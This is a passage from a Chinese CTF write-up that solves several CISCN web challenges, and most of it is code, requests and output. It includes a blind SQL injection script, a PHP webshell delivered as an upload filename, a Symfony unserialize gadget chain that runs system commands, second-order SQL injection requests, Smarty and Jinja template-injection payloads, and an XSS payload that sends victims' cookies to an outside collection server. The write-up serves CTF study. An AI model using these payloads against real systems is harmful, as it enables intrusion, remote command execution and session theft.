'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #ciscnfinal\n\n# get_tables('ciscnfinal') #images,users\n\nget_data('password','users') #1f97eef3ea37a28db040\n```\n\n其实直接猜表为users和栏password就好了   \n\n拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件\n\n```\nI logged the file name you uploaded to logs/upload.054981d8766f246f4da3af656bbf6fe9.log.php.\n```\n\n修改文件名为\n\n```\nContent-Disposition: form-data; name=\"file\"; filename=\"<?= eval($_POST['cmd']) ?>\"\n```\n\n短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。\n\n采用js写法的标记发现不起作用。\n\n菜刀连接，flag在根目录，打开即可\n\n![](/pic/85.png)\n\n\n\n## 总决赛 Day1 Web4 Laravel1\n\n打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计\n\n```php\n <?php\n//backup in source.tar.gz\n\nnamespace App\\Http\\Controllers;\n\n\nclass IndexController extends Controller\n{\n    public function index(\\Illuminate\\Http\\Request $request){\n        $payload=$request->input(\"payload\");\n        if(empty($payload)){\n            highlight_file(__FILE__);\n        }else{\n            @unserialize($payload);\n        }\n    }\n} \n```\n\n直接给出了反序列化函数，接下来就是寻找POP链\n\n其中包含命名空间 [关于命名空间](https://www.runoob.com/php/php-namespace.html)\n\n先搜索__destruct，发现很多里面都是空的\n\n![](/pic/86.png)\n\n后面在`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php`找到一个\n\n![](/pic/87.png)\n\n查看`invalidateTags`方法的定义\n\n![](/pic/88.png)\n\n其中有一个`saveDeferred`，全局搜索看看，找到了`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php`\n\n![](/pic/89.png)\n\n接着看`dosave`，就在当前页面的下面\n\n![](/pic/90.png)\n\n此处存在动态调用可以调用到`system()`\n\n![](/pic/91.png)\n\n`$this->setInnerItem`可控，`$innerItem`是我们传入的`$item`类中的`$innerItem`属性\n\n这里可以看到有 **$item[“\\0\\*\\0expiry”]**、**$item[“\\0\\*\\0poolHash”]** 这种写法，数组键名带有 **\\0\\*\\0** 。这实际上是类中，修饰符为 **protected** 的属性，在类强转成数组之后的结果\n\n![](/pic/92.png)\n\n构造payload\n\n```php\n<?php\nnamespace Symfony\\Component\\Cache;\nclass CacheItem \n{\n\n    protected $innerItem = 'cat /flag';\n\n}\n\nnamespace Symfony\\Component\\Cache\\Adapter;\n\nclass ProxyAdapter\n{\n\tprivate $setInnerItem = 'system';\n}\n\nclass TagAwareAdapter\n{\n\tpublic $deferred = [];\n\tpublic function __construct()\n    {\n    \t$this->pool = new ProxyAdapter();\n\n    }\n}\n\n$a = new TagAwareAdapter();\n$a -> deferred = array('a' => new \\Symfony\\Component\\Cache\\CacheItem);\necho urlencode(serialize($a));  \n```\n\npayload\n\n```\n?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D\n```\n\n![](/pic/93.png)\n\n\n\n\n\n## 华北赛区 Day1 Web5 CyberPunk\n\n是一个登入页面，查看网页源码，在最后发现了\n\n```\n<!--?file=?-->\n```\n\n可能是文件下载或者是文件包含\n\n```\npayload=/index.php?file=index.php   返回数据为空\n```\n\n尝试使用伪协议\n\n```\npayload=/index.php?file=php://filter/convert.base64-encode/resource=index.php\n```\n\n读取成功\n\n```php+HTML\n//index.php\n<?php\n\nini_set('open_basedir', '/var/www/html/');\n\n// $file = $_GET[\"file\"];\n$file = (isset($_GET['file']) ? $_GET['file'] : null);\nif (isset($file)){\n    if (preg_match(\"/phar|zip|bzip2|zlib|data|input|%00/i\",$file)) {\n        echo('no way!');\n        exit;\n    }\n    @include($file);\n}\n?>\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>index</title>\n<base href=\"./\">\n<meta charset=\"utf-8\" />\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n        <h2>2077发售了,不来份实体典藏版吗?</h2>\n        <img class=\"logo\" src=\"./assets/img/logo-en.png\"><!--LOGOLOGOLOGOLOGO-->\n        <div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <h3>提交订单</h3>\n                <form role=\"form\" action=\"./confirm.php\" method=\"post\" enctype=\"application/x-www-urlencoded\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    <h3>地址:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"address\">\n                    </p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">我正是送钱之人</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n<!--?file=?-->\n```\n\n```php+HTML\n//search.php\n<?php\n\nrequire_once \"config.php\"; \n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ \n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        if(!$row) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"<p>姓名:\".$row['user_name'].\"</p><p>, 电话:\".$row['phone'].\"</p><p>, 地址:\".$row['address'].\"</p>\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>搜索</title>\n<base href=\"./\">\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>订单查询</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">查询订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a> \n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>    \n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//change.php\n<?php\n\nrequire_once \"config.php\";\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = addslashes($_POST[\"address\"]);\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $sql = \"update `user` set `address`='\".$address.\"', `old_address`='\".$row['address'].\"' where `user_id`=\".$row['user_id'];\n        $result = $db->query($sql);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单修改成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>修改收货地址</title>\n<base href=\"./\">\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>修改收货地址</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    <h3>地址:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"address\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">修改订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//delete.php\n<?php\n\nrequire_once \"config.php\";\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ \n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if (isset($fetch) && $fetch->num_rows>0){\n        $row = $fetch->fetch_assoc();\n        $result = $db->query('delete from `user` where `user_id`=' . $row[\"user_id\"]);\n        if(!$result) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单删除成功\";\n    } else {\n        $msg = \"未找到订单!\";\n    }\n}else {\n    $msg = \"信息不全\";\n}\n?>\n<!DOCTYPE html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>删除订单</title>\n<base href=\"./\">\n<meta charset=\"utf-8\" />\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n\t\t<div class=\"row\">\n\t\t\t<div class=\"col-md-8 col-md-offset-2 centered\">\n                <p style=\"margin:35px 0;\"><br></p>\n                <h1>删除订单</h1>\n                <form method=\"post\">\n                    <p>\n                    <h3>姓名:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"user_name\">\n                    <h3>电话:</h3>\n                    <input type=\"text\" class=\"subscribe-input\" name=\"phone\">\n                    </p>\n                    <p>\n                    <button class='btn btn-lg  btn-sub btn-white' type=\"submit\">删除订单</button>\n                    </p>\n                </form>\n                <?php global $msg; echo '<h2 class=\"mb\" style=\"color:#ffffff;\">'.$msg.'</h2>';?>\n            </div>\n        </div>\n    </div>\n</div>\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./index.php\">\n                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>\n            </a>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n```php+HTML\n//config.php\n<?php\n\nini_set(\"open_basedir\", getcwd() . \":/etc:/tmp\");\n\n$DATABASE = array(\n\n    \"host\" => \"127.0.0.1\",\n    \"username\" => \"root\",\n    \"password\" => \"root\",\n    \"dbname\" =>\"ctfusers\"\n);\n\n$db = new mysqli($DATABASE['host'],$DATABASE['username'],$DATABASE['password'],$DATABASE['dbname']);\n```\n\n```php+HTML\n//confirm.php\n<?php\n\nrequire_once \"config.php\";\n//var_dump($_POST);\n\nif(!empty($_POST[\"user_name\"]) && !empty($_POST[\"address\"]) && !empty($_POST[\"phone\"]))\n{\n    $msg = '';\n    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';\n    $user_name = $_POST[\"user_name\"];\n    $address = $_POST[\"address\"];\n    $phone = $_POST[\"phone\"];\n    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){\n        $msg = 'no sql inject!';\n    }else{\n        $sql = \"select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'\";\n        $fetch = $db->query($sql);\n    }\n\n    if($fetch->num_rows>0) {\n        $msg = $user_name.\"已提交订单\";\n    }else{\n        $sql = \"insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)\";\n        $re = $db->prepare($sql);\n        $re->bind_param(\"sss\", $user_name, $address, $phone);\n        $re = $re->execute();\n        if(!$re) {\n            echo 'error';\n            print_r($db->error);\n            exit;\n        }\n        $msg = \"订单提交成功\";\n    }\n} else {\n    $msg = \"信息不全\";\n}\n?>\n\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<title>确认订单</title>\n<base href=\"./\">\n<meta charset=\"utf-8\"/>\n\n<link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n<link href=\"assets/css/custom-animations.css\" rel=\"stylesheet\">\n<link href=\"assets/css/style.css\" rel=\"stylesheet\">\n\n</head>\n<body>\n<div id=\"h\">\n\t<div class=\"container\">\n        <img class=\"logo\" src=\"./assets/img/logo-zh.png\">\n        <div class=\"row\">\n            <div class=\"col-md-8 col-md-offset-2 centered\">\n                <?php global $msg; echo '<h2 class=\"mb\">'.$msg.'</h2>';?>\n                <a href=\"./index.php\">\n                <button class='btn btn-lg  btn-sub btn-white'>返回</button>\n                </a>\n            </div>\n        </div>\n    </div>\n</div>\n\n<div id=\"f\">\n    <div class=\"container\">\n\t\t<div class=\"row\">\n            <p style=\"margin:35px 0;\"><br></p>\n            <h2 class=\"mb\">订单管理</h2>\n            <a href=\"./search.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要查订单</button>\n            </a>\n            <a href=\"./change.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我要修改收货地址</button>\n            </a>\n            <a href=\"./delete.php\">\n                <button class=\"btn btn-lg btn-register btn-white\" >我不想要了</button>\n            </a>\n\t\t</div>\n\t</div>\n</div>\n\n<script src=\"assets/js/jquery.min.js\"></script>\n<script src=\"assets/js/bootstrap.min.js\"></script>\n<script src=\"assets/js/retina-1.1.0.js\"></script>\n<script src=\"assets/js/jquery.unveilEffects.js\"></script>\n</body>\n</html>\n```\n\n在confirm.php、delete.php、search.php和change.phpz中存在报错注入的可能，username和phone过滤非常严格，但是address没怎么过滤，所以考虑这个参数。\n\n因为在confirm.php中在存入的过程中使用了bind_param函数，所以无法绕过。在change.php将之前存入的地址拿来出来，存在二次注入。\n\n```http\nPOST /confirm.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 105\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select load_file('/flag.txt'))),0))#\n```\n\n```http\nPOST /change.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1\n```\n\n回显数据\n\n```\nerrorXPATH syntax error: 'flag{e9485017-ebf4-4ea4-8579-daa'\n```\n\n显示不全，再逆向输出一下\n\n```http\nPOST /confirm.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 114\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1'  where user_id=(updatexml(0,concat(0,(select reverse(load_file('/flag.txt')))),0))#\n```\n\n```http\nPOST /change.php HTTP/1.1\nHost: 4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 29\nOrigin: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn\nConnection: close\nReferer: http://4d856f75-0cc5-4e8f-b1e1-5f026bd17c15.node3.buuoj.cn/\nUpgrade-Insecure-Requests: 1\n\nuser_name=1&phone=1&address=1\n```\n\n输出内容\n\n```\nerrorXPATH syntax error: '\n}6e91d8479aad-9758-4ae4-4fbe-71'\n```\n\n拼接即可\n\n\n\n## 华东南赛区 Web11\n\n[关于SSTI](https://zhuanlan.zhihu.com/p/28823933)\n\n打开题目，页面说提供了查询公网IP的api,右上角还有显示IP，于是在头部加入X-Forwarded-For\n\n![](/pic/94.png)\n\n可能存在SSTI，测试一下的确存在SSTI\n\n![](/pic/96.png)\n\n在网页的最下方发现了**Build With Smarty** \n\n一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。 3.1.30\n\n![](/pic/97.png)\n\nSmarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但是Smarty3.0手册说已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。发现报错了\n\n![](/pic/98.png)\n\n{literal}可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。\n\n那么对于php5的环境我们就可以使用，服务器是7.0+无法使用js标签\n\n```\n<script language=\"php\">phpinfo();</script>\n```\n\n有一个[{if}标签](https://www.smarty.net/docs/zh_CN/language.function.if.tpl)可以使用\n\nmarty的`{if}`条件判断和PHP的[if](http://php.net/if) 非常相似，只是增加了一些特性。 每个`{if}`必须有一个配对的`{/if}`. 也可以使用`{else}` 和 `{elseif}`. 全部的PHP条件表达式和函数都可以在if内使用，如*||*, *or*, *&&*, *and*, *is_array()*, 等等.\n\n将X-Forwarded-For头改为{if phpinfo()}{/if}可以查看phpinfo\n\n![](/pic/99.png)\n\n{if system('cat /flag')}{/if}即可获取到flag\n\n[参考链接](https://www.jianshu.com/p/eb8d0137a7d3)\n\n\n\n## 华东北赛区 Web2\n\n使用御剑扫描发现login.php，admin.php\n\n![](/pic/100.png)\n\n访问admin.php，发现要admin才访问，去login.php注册一个账号，然后登入，有一个投稿\n\n![](/pic/101.png)\n\n明显的提示这题是XSS\n\n提交数据之后，“=” 被替换成了“等于号”，src,//被替换成waf，单引号、括号、双引号会被替换成中文的。\n\n来自赵师傅的payload     svg标签 ：xml自动解析html实体编码\n\n```php\nin_str = \"(function(){window.location.href='http://xss.buuoj.cn/index.php?do=api&id=dzWPkK&keepsession=0&location='+escape((function(){try{return document.location.href}catch(e){return''}})())+'&toplocation='+escape((function(){try{return top.location.href}catch(e){return''}})())+'&cookie='+escape((function(){try{return document.cookie}catch(e){return''}})())+'&opener='+escape((function(){try{return(window.opener&&window.opener.location.href)?window.opener.location.href:''}catch(e){return''}})());})();\"\noutput = \"\"\nfor c in in_str:\n    output += \"&#\" + str(ord(c))\nprint(\"<svg><script>eval&#40&#34\" + output + \"&#34&#41</script>\")\n```\n\n得到地址后去commitbug.php（反馈）页面提交url\n\n![](/pic/102.png)\n\nurl中要将*.buuoj.cn改成web\n\n附上碰撞的脚本，发现使用python编写会出错（字符与MD5对应不上）\n\n```php\n<?php\n\nfor($a=0;substr(md5($a),0,6)!='2ccf73';$a++){}\necho md5($a);\necho urldecode('%09');\necho $a;\n //2ccf731c402b81796327fb7a4c5cd943\t225315\n?>\n```\n\n去xss平台收cookie\n\n![](/pic/103.png)\n\n修改cookie为收到的cookie，访问admin.php   存在sql注入\n\n![](/pic/104.png)![](/pic/105.png)\n\n编写注入脚本\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/19/2020 12:34 AM\nimport requests\n\ndef str2hex(strs):\n    hexs='0x'\n    for x in range(len(strs)):\n        hexs+=hex(ord(strs[x]))[2:]\n    print(hexs)\n    return hexs\n\ndef get(payload):\n    url = 'http://da74811e-0cb8-498a-a1c7-362929c21b2d.node3.buuoj.cn/admin.php?id=0^('+payload+')'\n    # print(url)\n    html = requests.get(url,cookies={'PHPSESSID':'e7f4c1e48fd638f2a517cbe6d0a81857'})\n    # print(html)\n    return html\n\ndef binsea(s_payload,len=999):\n    result = ''\n    x=1\n    while x <= len :\n        error = 0\n        left = 0\n        right = 126\n        while left <= right:\n            mid = (left + right) / 2\n            payload = \"ascii(substr((%s),%d,1))>%d\" % (s_payload,x, mid)\n\n            res = get(payload)\n            if res.status_code == 404 or res.status_code == 429:\n                x=x-1\n                error = 1\n                break\n            html=res.text\n            # print(html,'*-*-*-*-*-*', mid)\n            if '不能查询管理员哦'  in html:\n                left = mid +1\n            else:\n                right = mid -1\n        mid = int((left + right + 1) / 2)\n        if mid == 0 :\n            break\n        if error == 0 :\n            result += chr(mid)\n            print(result)\n        x=x+1\n    return result\n\ndef get_database():\n    s_payload='database()'\n    database = binsea(s_payload)\n    print(database)\n\ndef get_tables(db):\n    db=str2hex(db)\n    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'\n    tables=binsea(s_payload)\n\ndef get_columns(table):\n    table = str2hex(table)\n    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'\n    columns=binsea(s_payload)\n\ndef get_data(columns,table):\n    s_payload='select(group_concat('+columns+'))from('+table+')'\n    password=binsea(s_payload)\n\n\n# get_database() #ciscn\n\n# get_tables('ciscn') #flag,users\n\n# get_columns('flag') #flagg\n\nget_data('flagg','flag') #flag{88331b80-7fb8-4f2f-9fa1-a4b85bd8562d}\n```\n\n\n\n## 华东南赛区 Double Secret\n\n打卡题目的提示是:`Welcome To Find Secret`\n\n使用御剑扫一下目录，扫描到robots.txt\n\n内容是: `It is Android ctf`\n\n尝试范围/secret  提示`Tell me your secret.I will encrypt it so others can't see`\n\n传入参数?secret=123456789后报错\n\n![](/pic/106.png)\n\n发现是flask框架，点开/app/app.py后有如下代码\n\n```python\nFile \"/app/app.py\", line 35, in secret\n\n    if(secret==None):\n\n        return 'Tell me your secret.I will encrypt it so others can\\'t see'\n\n    rc=rc4_Modified.RC4(\"HereIsTreasure\")   #解密\n\n    deS=rc.do_crypt(secret)\n\n\n    a=render_template_string(safe(deS))\n\n [Open an interactive python shell in this frame]  \n\n    if 'ciscn' in a.lower():\npython\n        return 'flag detected!'\n\n    return a\n```\n\n是RC4加密，RC4算法加密又是解密将payload加密就好\n\n```python\n# -*- coding: utf-8 -*-\n# @Time    : 2/25/2020 11:38 PM\nimport urllib\nimport requests\n\n\nclass RC4:\n    def __init__(self, key):\n        self.key = key\n        self.key_length = len(key)\n        self._init_S_box()\n\n    def _init_S_box(self):\n        self.Box = [i for i in range(256)]\n        k = [self.key[i % self.key_length] for i in range(256)]\n        j = 0\n        for i in range(256):\n            j = (j + self.Box[i] + ord(k[i])) % 256\n            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]\n\n    def crypt(self, plaintext):\n        i = 0\n        j = 0\n        result = ''\n        for ch in plaintext:\n            i = (i + 1) % 256\n            j = (j + self.Box[i]) % 256\n            self.Box[i], self.Box[j] = self.Box[j], self.Box[i]\n            t = (self.Box[i] + self.Box[j]) % 256\n            result += chr(self.Box[t] ^ ord(ch))\n        return result\n\n\nurl = \"http://69f0dda2-d8d5-458e-97f9-342bff8d47a4.node3.buuoj.cn/secret?secret=\"\na = RC4('HereIsTreasure')\ncmd = \"{{ [].__class__.__base__.__subclasses__()[40]('/flag.txt').read() }}\"\npayload = 